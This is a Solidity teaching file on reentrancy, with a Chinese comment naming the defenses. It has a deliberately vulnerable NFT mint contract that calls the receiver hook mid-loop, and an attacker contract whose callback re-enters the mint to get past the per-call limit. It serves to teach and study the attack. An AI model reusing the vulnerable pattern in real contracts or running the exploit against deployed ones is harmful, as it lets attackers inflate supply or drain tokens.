// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

//抵御重入攻击 1.状态锁 2.外部调用放到最后
contract myNFT {
    using Address for address;
    mapping(address => uint256) balances;
    uint256 public totalSupply = 16378;

    // 6 + 5 4 3 2 1 => 21
    function mintNFT(uint256 num) external {
        require(totalSupply < 16384, "exceed totalSupply");
        require(num <= 6, "too much");
        require(totalSupply + num <= 16384, "exceed totalSupply");
        for (uint256 i = 0; i < num; i++) {
            safeMint(msg.sender);
        }
    }

    function safeMint(address to) internal {
        totalSupply++;
        balances[to]++;
        if (to.isContract()) {
            IERC721Receiver(to).onERC721Received(to, address(0), 0, "");
        }
    }
}

contract NFTAttack is IERC721Receiver {
    uint256 currentValue;

    function attack(address nftToken) external {
        currentValue = 6;
        myNFT(nftToken).mintNFT(currentValue);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (currentValue == 0) {
            return "0x00";
        }
        currentValue--;
        if (currentValue > 0) {
            myNFT(msg.sender).mintNFT(currentValue);
        }
        return "0x01";
    }
}
